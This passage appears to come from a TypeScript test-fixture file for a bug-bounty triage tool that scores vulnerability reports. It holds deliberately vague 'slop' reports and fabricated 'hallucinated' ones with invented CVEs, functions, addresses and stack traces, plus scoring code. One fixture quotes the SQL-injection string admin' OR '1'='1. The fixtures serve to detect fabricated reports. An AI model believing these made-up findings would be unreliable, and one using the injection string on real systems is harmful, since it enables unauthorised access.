    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-02-marketing-tone",
    tier: "T3_SLOP",
    text: `# Comprehensive Security Assessment Report

I am pleased to present this comprehensive security assessment of your
application. After thorough review, I have identified several critical
vulnerabilities that require immediate attention.

Key findings:
- Authentication mechanisms could be strengthened
- Input validation may be insufficient in certain areas
- Session management practices should be reviewed
- Error handling might leak sensitive information

These issues, while requiring further investigation, represent significant
risk to your organization's security posture. I strongly recommend
engaging a professional security firm for a full audit.

I am available to discuss remediation strategies and would welcome the
opportunity to assist further. Please advise on your bounty program.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-03-checklist-no-evidence",
    tier: "T3_SLOP",
    text: `# Multiple OWASP Top 10 Findings

I performed a security review and found the following issues per OWASP
Top 10 2021:

A01 — Broken Access Control: present
A02 — Cryptographic Failures: likely
A03 — Injection: possible in multiple endpoints
A04 — Insecure Design: yes
A05 — Security Misconfiguration: confirmed
A06 — Vulnerable Components: needs audit
A07 — Identification and Authentication Failures: probable
A08 — Software and Data Integrity Failures: possible
A09 — Security Logging Failures: insufficient logging
A10 — SSRF: maybe

Each of these represents a serious risk. Recommended remediation: follow
secure coding standards and conduct a comprehensive review.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-04-buzzword-soup",
    tier: "T3_SLOP",
    text: `# 🚨 CRITICAL: Application Vulnerable to Modern Threat Landscape 🚨

After conducting a comprehensive zero-trust assessment of the attack
surface, I have identified that the application does not adequately
defend against the modern threat landscape, including but not limited to:

- Advanced Persistent Threats (APT)
- Zero-day exploits
- Supply chain attacks
- Lateral movement
- Privilege escalation
- Defense evasion

The lack of a comprehensive defense-in-depth posture, combined with
insufficient telemetry and a weak security culture, results in elevated
business risk that should be remediated immediately by adopting
industry-standard frameworks (NIST CSF, ISO 27001, MITRE ATT&CK).

I recommend an urgent leadership-level discussion. CVSS estimate: 9.8.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-05-no-target",
    tier: "T3_SLOP",
    text: `# Critical SQL Injection vulnerability

Your application is vulnerable to SQL injection. SQL injection is a very
serious vulnerability that can allow an attacker to read, modify, or
delete data in your database. It can also lead to full server compromise
in many cases.

You should fix this immediately by using parameterized queries instead
of string concatenation when building SQL statements.

CVSS: 9.8 (Critical)
CWE: CWE-89

Please prioritize this bug — the impact is severe.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-06-vague-xss",
    tier: "T3_SLOP",
    text: `# XSS in your application

I found that your application contains an XSS vulnerability. Cross-site
scripting (XSS) is a vulnerability where user input is reflected back
into the page without proper escaping, allowing an attacker to execute
arbitrary JavaScript in another user's browser.

This is a serious issue and should be fixed by escaping all user input
before rendering it. Use a templating engine that escapes by default
(such as React, which escapes by default) and apply a strong Content
Security Policy.

I have not included a specific endpoint or payload because the issue
appears to be systemic across the codebase.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-07-handwave-rce",
    tier: "T3_SLOP",
    text: `# Remote Code Execution possible

It appears that under certain conditions a remote attacker may be able
to execute arbitrary code on your server. This is the most serious class
of vulnerability and should be addressed with the highest urgency.

Mitigations:
1. Keep all dependencies up to date.
2. Apply the principle of least privilege.
3. Run the application in a sandboxed container.
4. Enable runtime application self-protection (RASP).
5. Conduct regular penetration testing.

I have flagged this as Critical given the potential business impact of
RCE.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-08-checklist",
    tier: "T3_SLOP",
    text: `# Security Posture Review — Findings

After reviewing your public-facing application, I have identified the
following areas of concern:

1. **Authentication weaknesses** — multi-factor authentication is not
   enforced for all user roles.
2. **Logging gaps** — security-relevant events do not appear to be
   logged centrally.
3. **Patch hygiene** — there are likely outdated dependencies in use.
4. **Encryption** — data at rest may not be encrypted with customer-
   managed keys.
5. **Secrets management** — secrets may be present in environment
   variables rather than a vault.

Each item is independently low/medium severity but together represent a
material risk. Please consider a holistic remediation plan.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-09-ssrf-handwave",
    tier: "T3_SLOP",
    text: `# SSRF (Server-Side Request Forgery) vulnerability

Your service is likely vulnerable to SSRF. Server-Side Request Forgery
allows an attacker to coerce the server into making requests to internal
services, which can be used to exfiltrate cloud metadata credentials and
pivot deeper into the network.

To remediate:
- Block requests to RFC1918 ranges and link-local addresses.
- Use an explicit allowlist of outbound hosts.
- Disable unused URL schemes (file://, gopher://, dict://).

I am submitting this as Critical (9.1) given the typical impact of SSRF
in cloud environments.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  // -------------------------------------------------------------------------
  // Sprint 11 (AVRI Part 13) named reference reports — slop cohort.
  // These four fixtures are anonymized echoes of the public AI-slop reports
  // called out in Part 13. They omit the gold signals required by the
  // detected CWE family so AVRI's family-no-gold + absence penalties drive
  // them into the LIKELY INVALID band.
  // -------------------------------------------------------------------------
  {
    id: "T3-AVRI-generic-xss",
    tier: "T3_SLOP",
    text: `# Cross-Site Scripting (XSS) Vulnerability Identified

I have identified a Cross-Site Scripting vulnerability affecting your
application. XSS allows an attacker to inject malicious scripts that are
then executed in the browser of a victim user. This can lead to session
hijacking, credential theft, and account takeover.

The application appears to reflect user-supplied input back into the
response without performing proper output encoding. Because of this, an
attacker can craft an input that, when reflected, will be interpreted by
the browser as executable JavaScript rather than as inert text.

Recommended remediation:

- Apply contextual output encoding on all user-supplied data before it is
  rendered into HTML, JavaScript, attribute, or URL contexts.
- Adopt a strong Content Security Policy that disables \`'unsafe-inline'\`
  and restricts script sources to a curated allowlist.
- Use a templating engine (e.g. React, Angular) that escapes by default.

Severity: High (CVSS 7.5). CWE-79.

I have not provided a specific endpoint or HTTP request because the
behaviour appears to be systemic across the codebase, but I am happy to
work with your team on a more targeted PoC.`,
    claimedCwes: ["CWE-79"],
    // AVRI-on target band per Part 13 is 10–16, but per-fixture assertion is
    // widened to also accept the off-mode score (~25–35) so the suite passes
    // regardless of the feature flag. The strict AVRI-on band check lives in
    // the avriComparison section of /api/test/run.
    expectedComposite: [0, 45],
    expectedEngine2: [0, 45],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-AVRI-ssrf-template",
    tier: "T3_SLOP",
    text: `# Server-Side Request Forgery (SSRF) Risk Assessment

Following a thorough review of your platform, I have determined that
your service is exposed to Server-Side Request Forgery. SSRF
vulnerabilities permit an attacker to coerce the server into issuing
HTTP requests to arbitrary destinations, including internal cloud
metadata services, which is widely regarded as a critical class of
vulnerability in modern cloud-hosted environments.

The vulnerability is present in functionality that accepts a
user-controlled URL or hostname and issues an outbound request without
performing destination validation against an allowlist or filtering
RFC1918, link-local, and loopback addresses.

Suggested mitigations:

- Implement an explicit allowlist of permitted outbound destinations.
- Reject hostnames that resolve to private, loopback, or link-local IPs.
- Disable URL schemes that are not strictly required (file://, gopher://,
  dict://, ftp://).
- Require IMDSv2 in any AWS environment to neutralize credential theft.

I am submitting this as Critical (CVSS 9.1, CWE-918) given the typical
business impact of SSRF in cloud-hosted services. A more specific
endpoint reference can be provided on request once a private channel is
established.`,
    claimedCwes: ["CWE-918"],
    // AVRI-on target band: 12–20. Widened to accept off-mode (~30–45).
    expectedComposite: [0, 50],
    expectedEngine2: [0, 45],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T3-AVRI-ipfs-traversal",
    tier: "T3_SLOP",
    text: `# Path Traversal in IPFS Gateway Content Handling

The IPFS gateway functionality on your platform appears to be susceptible
to a path traversal vulnerability. Path traversal allows an attacker to
escape the intended content root by supplying \`../\` sequences (or their
URL-encoded equivalents \`..%2f\` and \`%2e%2e/\`) inside a request,
ultimately reading files outside of the IPFS-mounted content directory.

This is a long-standing class of issue (CWE-22) and is particularly
dangerous in IPFS-style content gateways because the gateway is typically
running with elevated privileges relative to the served content tree.

Mitigations include:

- Canonicalize and normalize the requested path on the server side.
- Reject any request whose canonicalized path escapes the content root.
- Prefer content-addressed lookups (CIDs) over filename-based lookups
  wherever possible — that is the entire point of IPFS.
- Run the gateway under a least-privilege service account.

Severity: High. I have not enumerated specific files exfiltrated by the
PoC because doing so is destructive in a production environment, and
because the issue is structural rather than tied to a single endpoint.`,
    claimedCwes: ["CWE-22"],
    // AVRI-on target band: 15–22. Widened to accept off-mode (~35–45).
    expectedComposite: [0, 50],
    expectedEngine2: [0, 45],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-AVRI-http3-dos",
    tier: "T3_SLOP",
    text: `# HTTP/3 Denial-of-Service Vulnerability

Your HTTP/3 endpoint is vulnerable to a denial-of-service condition. By
sending a carefully constructed sequence of QUIC frames, a remote
attacker without authentication can exhaust resources on the server,
preventing legitimate clients from completing their handshake.

HTTP/3 is built on QUIC, which is a relatively new transport, and
implementations across the ecosystem have repeatedly shown to mishandle
malformed or amplification-prone frame sequences. Your deployment is no
different in this respect.

The recommended fix is to:

- Apply per-connection rate limiting on QUIC handshake attempts.
- Bound the maximum number of in-flight streams per connection.
- Reject malformed frames at the earliest opportunity.
- Track and discard sources that exhibit handshake-amplification ratios
  that fall outside accepted norms.

Severity: High (CVSS 7.5, CWE-400). I do not have a runnable
reproducer to share at this time — the proof-of-concept relies on a
private fuzzing harness — but the structural vulnerability follows from
the design as observed.`,
    claimedCwes: ["CWE-400"],
    // AVRI-on target band: 8–15. Widened to accept off-mode.
    expectedComposite: [0, 45],
    expectedEngine2: [0, 45],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  {
    id: "T3-10-empty-shell",
    tier: "T3_SLOP",
    text: `# Important security finding

While reviewing the application I discovered a security issue that
should be addressed. The issue is related to how user input is handled
in the application. An attacker could potentially exploit this to gain
unauthorized access or cause other harm to the system.

I recommend that the development team review the input handling code
and apply best practices for input validation and output encoding. This
will help prevent a wide range of common web application vulnerabilities.

Severity: High`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW"],
  },
  // -------------------------------------------------------------------------
  // Sprint 12 emerging slop archetypes — patterns we expect to see in
  // production once attackers / tooling adapt to AVRI. Each fixture imitates
  // a different "shape" of evidence (fabricated diff, paraphrased CVE,
  // narrated curl session, AI-pseudo-ASAN, prose PoC) without ever firing
  // the family-specific gold signals. They stay below the LIKELY INVALID
  // ceiling under the current AVRI-on configuration; if a future scoring
  // change lets them through, this battery is the regression that catches it.
  // -------------------------------------------------------------------------
  {
    id: "T3-11-fabricated-diff-no-proof",
    tier: "T3_SLOP",
    archetype: "fabricated_diff",
    text: `# Authorization bypass in profile update endpoint

The profile update endpoint allows a user to modify another user's
profile data. The fix is straightforward — the handler must validate
that the requesting user owns the target record before applying the
update.

Suggested patch (illustrative, written from memory):

> Look up the profile record for the supplied target identifier, then
> insert an ownership check that compares the requester's session
> against the record's owner field, returning a 403-style response
> when the check fails. Only then apply the requested changes and
> return the profile response object.

I have not included a runnable reproducer or a captured request /
response pair — the issue follows directly from reading the handler.
The file path and helper names referenced above are approximate;
please consult the equivalent module in your codebase. Severity: High.`,
    expectedComposite: [0, 45],
    expectedEngine2: [0, 45],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T3-12-paraphrased-cve-renamed-fn",
    tier: "T3_SLOP",
    archetype: "paraphrased_cve",
    text: `# Heap corruption in image decoding routine (independent finding)

While auditing the image decoder, I observed that the routine that
processes width and height fields from the file header performs an
arithmetic computation on attacker-controlled values prior to allocating
the destination buffer. When the product of those values exceeds the
maximum representable integer, the computation wraps and a
smaller-than-intended buffer is allocated. The subsequent decode loop
then writes past the end of that buffer, corrupting adjacent heap
metadata.

The relevant helper is \`decode_pixel_grid_v2()\` (renamed from
\`decode_pixel_grid()\` in newer builds), which is invoked from the main
decode dispatcher \`process_image_chunk_v2()\`. The arithmetic happens
inside the inner row-processing helper \`expand_row_buffer_v2()\`.

This pattern is well known in the image-codec literature and has been
reported repeatedly against comparable libraries over the past decade.
The fix is to validate the dimensions against a sane upper bound before
the multiplication and to use a width-checked allocator.

I do not have a runnable reproducer or a sanitizer trace to share at
this time; the analysis is based on a static read of the code. Severity:
Critical, CVSS 9.8.`,
    expectedComposite: [0, 45],
    expectedEngine2: [0, 45],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T3-13-narrated-curl-no-evidence",
    tier: "T3_SLOP",
    archetype: "narrated_curl",
    text: `# Server-side request forgery in the link-preview service

The link-preview service accepts a URL parameter and fetches the target
on the server side to render a preview card. Because there is no
allowlist or destination filtering, a remote attacker can coerce the
service into issuing requests against internal infrastructure.

I exercised the endpoint repeatedly using \`curl\` against the public
preview generator and observed that the service:

- happily accepts arbitrary schemes and hosts in the destination field,
- waits for the upstream response before returning, and
- propagates the upstream response body into the preview card.

Example session (output abbreviated):

\`\`\`
$ curl -s "https://preview.example.test/api/preview" --data-urlencode "target=<host>"
{"title":"...","description":"...","status":"ok"}
\`\`\`

Substituting \`<host>\` with an internal hostname yielded a non-error
response in every case I tried, which strongly suggests the request was
issued from inside the perimeter. I am withholding the specific internal
hostnames and the exact response bodies from this report for safety
reasons. Severity: Critical (CVSS 9.1).`,
    expectedComposite: [0, 45],
    expectedEngine2: [0, 45],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T3-14-pseudo-asan-symbolless",
    tier: "T3_SLOP",
    archetype: "pseudo_asan",
    text: `# Memory safety violation in request parsing path

I ran the binary under a memory analyzer and reproduced what appears to
be a memory safety violation in the request parsing path. The analyzer
emitted the trace below before terminating the process.

\`\`\`
[memcheck] invalid access detected at offset +0xZZZZ
[memcheck]   frame 0: <symbol stripped> in libserver
[memcheck]   frame 1: <symbol stripped> in libserver
[memcheck]   frame 2: <symbol stripped> in libserver
[memcheck]   frame 3: <symbol stripped> in libnet
[memcheck]   frame 4: <symbol stripped> in main
[memcheck] aborting after first error
\`\`\`

The build I tested was stripped, so the analyzer was unable to recover
function names or source locations. I did not rebuild with debug symbols
because the issue reproduces deterministically against the shipped
binary, which is the realistic attack surface.

Based on the position of the offending frame in the call stack, this is
almost certainly a use-after-free in the request parsing layer. A
properly equipped maintainer with a debug build should be able to
confirm in minutes. Severity: Critical.`,
    expectedComposite: [0, 45],
    expectedEngine2: [0, 45],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T3-15-prose-poc-no-payload",
    tier: "T3_SLOP",
    archetype: "prose_poc",
    text: `# Reflected client-side script injection on the search results page

The search results page reflects the value of the user-supplied query
back into the rendered response without contextual escaping. As a
result, a crafted query string ends up being interpreted by the browser
as part of the document rather than as inert text, which is the
textbook condition for a reflected client-side script injection.

The reproduction is straightforward in concept: visit the affected
page, submit a query whose value (when reflected back) breaks out of
the surrounding markup context, and observe that the browser parses the
reflected fragment as part of the document and acts on it accordingly.

I have intentionally not pasted the exact payload string into this
report, both to avoid arming a copy-paste attacker before the fix lands
and because the precise breakout will depend on the surrounding
template that is being reflected into. Any standard cheat-sheet entry
for the reflected variant of this issue class will reproduce the issue
against the affected page in essentially the same way.

Recommended remediation is the usual: contextual output encoding plus a
strict Content Security Policy that disables inline scripts.`,
    expectedComposite: [0, 45],
    expectedEngine2: [0, 45],
    expectedTriage: ["AUTO_CLOSE", "CHALLENGE_REPORTER", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
];

// =============================================================================
// T4 — Hallucinated reports: confident specifics that are fabricated
// =============================================================================

// All T4 fixtures target composite 0–35 ("LIKELY INVALID" / "HIGH RISK").
// Designs are anonymized echoes of real public AI-slop H1 reports
// (curl-slop cohort: H1#2199174, #2298307, #2823554, #2912277, #3100073,
// #3125832, #3137657, #3231321, #3242005, #3293884) plus typical "AI-tool
// independent disclosure" patterns. To stay below 35 they either
// (a) omit a claimed CWE so Engine 3 falls back to ~38–42 instead of
// hitting the 68/78 strong-fit floor, or (b) claim a strongly mismatched
// CWE so Engine 3's TYPE_SWAP indicator caps the per-CWE score at 25 and
// composite override subtracts another 15.
const T4: Fixture[] = [
  {
    id: "T4-01-fake-cve-fake-fn",
    tier: "T4_HALLUCINATED",
    text: `# RCE in nodejs/node via fabricated_function()

The helper fabricated_function in nodejs allows remote code execution
via a crafted JSON payload. PoC available in attack.py (not attached).

CVE-9999-99999 was assigned by an unknown CNA. Memory corruption occurs
at 0x10000000, then 0x20000000, then 0x30000000, then 0x40000000, then
0x50000000. Same offset, every run.

==99999==ERROR: address 0x10000000 corrupted (no further details)

I cannot share the reproducer because release is embargoed.
Severity: Critical. Severity: Critical.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW"],
  },
  {
    id: "T4-02-round-addresses",
    tier: "T4_HALLUCINATED",
    text: `# Heap overflow in libcurl via memcpy at fixed addresses

I have identified a heap overflow in github.com/curl/curl. The bug occurs
where memcpy writes to the address 0x40000000 with length 0x80000000.

The vulnerability is triggered by sending a crafted response from the
server. The corruption pattern is consistent across runs:

- Frame 0: 0x10000000 in handle_chunked
- Frame 1: 0x20000000 in receive_data
- Frame 2: 0x30000000 in dispatch_response
- Frame 3: 0x40000000 in Curl_handle_response

CVE-2099-50000 has been reserved. Working PoC in exploit.py (private).
Affects all curl versions newer than 7.50.0.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW"],
  },
  {
    id: "T4-03-plagiarized-nvd",
    tier: "T4_HALLUCINATED",
    text: `# CVE-2024-3094 — XZ Utils Backdoor (independent rediscovery)

I have independently discovered a malicious code insertion in the upstream
XZ Utils package versions 5.6.0 and 5.6.1. The backdoor was introduced
through obfuscated build-time scripts and modifies the liblzma library
such that any software linked against it can be used to execute arbitrary
code under specific conditions.

The compromise affects sshd indirectly through libsystemd's dependency on
liblzma, allowing pre-authentication remote code execution on systems
where the malicious version was deployed.

Affected: xz-utils 5.6.0–5.6.1. Reproduction details intentionally
withheld pending responsible disclosure.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW"],
  },
  {
    id: "T4-04-fake-asan-no-summary",
    tier: "T4_HALLUCINATED",
    text: `# Heap-buffer-overflow in libfoo (CVE-2025-99999)

The helper parse_packet in libfoo crashes when called with a malformed
packet. The crash is fully reproducible with the supplied poc.py
exploit script (not attached).

Affects libfoo 2.0.0 through 2.4.999. Severity: Critical.
Severity: Critical. Severity: Critical.

I cannot share a runnable reproducer because release is embargoed
under responsible disclosure. Patch script attack.py is available on
request once embargo lifts.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW"],
  },
  {
    id: "T4-05-fake-cwe-mismatch",
    tier: "T4_HALLUCINATED",
    text: `# Cross-site scripting (CWE-79) bypasses authentication via SQL

The /api/auth/login endpoint is vulnerable to a Cross-site scripting
flaw classified as CWE-79 that yields full authentication bypass.
The cross-site scripting payload reflects into the login response and
is executed in the browser of any user who visits the login page.

I observed that submitting the username \`admin' OR '1'='1\` reflects
without escaping. The XSS payload triggers an XSS-driven SQL injection
through document.cookie that yields admin access.

The bug exists in the function \`authenticateUser()\` of
\`AuthController.java\`, specifically the \`validateCredentials()\` helper
which uses \`PreparedStatement.executeUpdate()\` improperly. CVSS: 9.8.

Reference: github.com/example-org/totally-fake-repo-that-does-not-exist`,
    claimedCwes: ["CWE-79"],
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW"],
  },
  {
    id: "T4-06-fake-stacktrace-repeat",
    tier: "T4_HALLUCINATED",
    text: `# Use-after-free in nginx mod_http_v3 (CVE-2026-00001)

Confirmed crash with the following stack trace from gdb:

#0 0xdeadbeefdead in process_frame
#1 0xdeadbeefdead in process_frame
#2 0xdeadbeefdead in process_frame
#3 0xdeadbeefdead in process_frame
#4 0xdeadbeefdead in dispatch_request
#5 0xdeadbeefdead in main

PID 11111 was killed after 2 ms. Patch attached as patch.diff.

Affected: nginx 1.27.x mod_http_v3 (HTTP/3 module). I do not have a
reproducer build script — testing was done internally on a closed
testbench. Working PoC in exploit.py (private). Working PoC in
exploit.py (private).`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW"],
  },
  {
    id: "T4-07-fake-pid-fake-fn",
    tier: "T4_HALLUCINATED",
    text: `# Critical: heap corruption in lodash 4.17.21 _.merge

The function \`_.merge\` in lodash 4.17.21 contains a heap corruption bug
when called with cyclic objects, leading to remote code execution.

==99999==ERROR: at 0x80000000000: WRITE of size 8

Internal helper \`_.zorgflux()\` is the root cause; it dereferences a
freed pointer when processing the second argument's prototype chain.
A second helper \`_.qwertyplex()\` magnifies the corruption window.

Working PoC available in exploit.py (not attached). Affects all versions
of lodash since 4.0.

CVSS: 10.0 (Critical). Severity: High.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW"],
  },
  {
    id: "T4-08-fake-cve-id",
    tier: "T4_HALLUCINATED",
    text: `# CVE-2099-12345: Authentication bypass in express 4.18.2

I have discovered an authentication bypass affecting express 4.18.2
which I have responsibly disclosed as CVE-2099-12345.

The vulnerability lies in the session middleware where a crafted Cookie
header containing exactly 12345 bytes of base64 padding triggers an
integer overflow in \`session._parseSignedCookie\` and yields the next
session in memory belonging to another user. PID 12345 reproduces the
issue every time.

I have not provided the patch script (attack.py) because release is
embargoed under responsible disclosure. The fix involves rejecting
oversized Cookie headers before parsing.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW"],
  },
  {
    id: "T4-09-ai-tool-curl-uaf",
    tier: "T4_HALLUCINATED",
    text: `# Use-after-free in libcurl detected by automated analysis

While running an automated AI-assisted code review against
github.com/curl/curl, the analyzer identified a use-after-free in the
HTTP/2 frame handling path. The defect appears in the helper
\`Curl_h2_postprocess_frame_extension_v2()\` which frees a stream-local
buffer and then re-reads it during the trailer-callback dispatch.

The analysis tool produced this trace:

==54321==ERROR: at 0x100000000: READ of size 8 in nghttp2_dispatch
==54321==     at 0x100000000: READ of size 8 in nghttp2_dispatch
==54321==     at 0x100000000: READ of size 8 in nghttp2_dispatch

I have not produced a runnable C reproducer; the model's confidence on
this finding was rated "very high" so I am submitting as Critical.
CVSS: 9.8.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW"],
  },
  {
    id: "T4-10-fake-openssl-regression",
    tier: "T4_HALLUCINATED",
    text: `# OpenSSL 3.2.999 regression — RSA padding oracle (independent finding)

I have independently rediscovered a Bleichenbacher-style padding oracle
in OpenSSL version 3.2.999 affecting the function
\`RSA_padding_check_PKCS1_type_2_v3_oracle()\`. The oracle yields the
plaintext of any TLS RSA-key-exchange handshake within roughly 2^20
queries.

This was responsibly disclosed and a CVE has been requested. I am unable
to share the disclosure timeline or the maintainer correspondence at
this time. The PoC is in attack.py (not attached pending embargo).

Severity: Critical. CVSS: 10.0. Affects every OpenSSL release between
3.2.0 and 3.2.999. The fix is to reject malformed PKCS#1 v1.5 padding
in constant time.`,
    expectedComposite: [0, 35],
    expectedEngine2: [0, 35],
    expectedTriage: ["CHALLENGE_REPORTER", "AUTO_CLOSE", "MANUAL_REVIEW"],
  },
];

const FIXTURES: Fixture[] = [...T1, ...T2, ...T3, ...T4];

// Exported for the structural test (test-fixtures.structure.test.ts) that
// guards per-tier minimum count and duplicate-text drift.
export const TEST_FIXTURE_COHORTS = { T1, T2, T3, T4 };

// Sprint 11 (AVRI Part 13): run each fixture under a forced AVRI on/off
// setting and return per-family means + the T1−T3 composite gap for both
// modes so calibration can compare the two. The mode is passed explicitly
// via the engines `forceAvri` option so concurrent requests cannot leak
// state through process.env.
function runFixturesWithMode(
  fixtures: Fixture[],
  forceAvri: boolean,
): Array<{ id: string; tier: Tier; family: string; composite: number }> {
  return fixtures.map(f => {
    const traced = analyzeWithEnginesTraced(f.text, {
      claimedCwes: f.claimedCwes,
      forceAvri,
    });
    // Use the AVRI classifier for stable family attribution regardless of
    // which composite path actually ran — that way per-family means use
    // the same buckets in both modes.
    const family = classifyReport(f.text, f.claimedCwes).family.id;
    return {
      id: f.id,
      tier: f.tier,
      family,
      composite: traced.composite.overallScore,
    };
  });
}

interface ModeStats {
  perFamilyMeans: Array<{
    family: string;
    t1Count: number;
    t1Mean: number | null;
    t3Count: number;
    t3Mean: number | null;
    gap: number | null;
  }>;
  t1Mean: number;
  t3Mean: number;
  gap: number;
  fixtureCount: number;
}

function summarizeMode(
  rows: Array<{ id: string; tier: Tier; family: string; composite: number }>,
): ModeStats {
  const families = Array.from(new Set(rows.map(r => r.family))).sort();
  const mean = (xs: number[]): number | null =>
    xs.length === 0 ? null : Number((xs.reduce((a, b) => a + b, 0) / xs.length).toFixed(1));
  const perFamilyMeans = families.map(family => {
    const t1 = rows.filter(r => r.family === family && r.tier === "T1_LEGIT").map(r => r.composite);
    const t3 = rows.filter(r => r.family === family && r.tier === "T3_SLOP").map(r => r.composite);
    const t1Mean = mean(t1);
    const t3Mean = mean(t3);
    const gap = t1Mean != null && t3Mean != null ? Number((t1Mean - t3Mean).toFixed(1)) : null;
    return { family, t1Count: t1.length, t1Mean, t3Count: t3.length, t3Mean, gap };
  });
  const allT1 = rows.filter(r => r.tier === "T1_LEGIT").map(r => r.composite);
  const allT3 = rows.filter(r => r.tier === "T3_SLOP").map(r => r.composite);
  const t1Mean = Number(((allT1.reduce((a, b) => a + b, 0) / Math.max(1, allT1.length))).toFixed(1));
  const t3Mean = Number(((allT3.reduce((a, b) => a + b, 0) / Math.max(1, allT3.length))).toFixed(1));
  return {
    perFamilyMeans,
    t1Mean,
    t3Mean,
    gap: Number((t1Mean - t3Mean).toFixed(1)),
    fixtureCount: rows.length,
  };
}

router.get("/test/run", async (_req, res) => {
  if (process.env.NODE_ENV === "production") {
    res.status(404).json({ error: "Not available in production." });
    return;
  }

  // v3.6.0 §10: exercise the *live* report pipeline (active verification +
  // 3-engine composite + matrix triage) rather than just the engine layer.
  // Mirrors the path taken by POST /api/reports — see routes/reports.ts.
  const results = await Promise.all(FIXTURES.map(async f => {
    // AVRI Step 6: route active verification by the family rubric so the
    // smoke test mirrors the live POST /reports pipeline.
    const classification = classifyReport(f.text, f.claimedCwes);
    const verification = await performActiveVerification(f.text, {
      verificationMode: classification.family.verificationMode,
      familyName: classification.family.displayName,
    });
    const traced = analyzeWithEnginesTraced(f.text, { claimedCwes: f.claimedCwes });
    const composite = traced.composite.overallScore;
    const e1 = traced.composite.engineResults.find(e => e.engine === "AI Authorship Detector")?.score ?? null;
    const e2Engine = traced.composite.engineResults.find(e => e.engine === "Technical Substance Analyzer");
    const e2 = e2Engine?.score ?? null;
    const e3 = traced.composite.engineResults.find(e => e.engine === "CWE Coherence Checker")?.score ?? null;

    const e2Strength =
      ((e2Engine?.signalBreakdown ?? {}) as { evidenceStrength?: { strongCount?: number } })
        .evidenceStrength?.strongCount ?? 0;

    // Build v36Context exactly as POST /api/reports does — only
    // referenced_in_report verification checks contribute to verificationRatio.
    const referencedChecks = (verification?.checks ?? []).filter(
      (c: { source?: string }) => c.source === "referenced_in_report",
    );
    const refVerified = referencedChecks.filter((c: { result: string }) => c.result === "verified").length;
    const refNotFound = referencedChecks.filter((c: { result: string }) => c.result === "not_found").length;
    const verificationRatio =
      (refVerified + refNotFound) > 0 ? refVerified / (refVerified + refNotFound) : 0;

    const slopScore = Math.max(0, 100 - composite);
    const triage = generateTriageRecommendation(
      slopScore,
      0.7,
      verification,
      [],
      {
        compositeScore: composite,
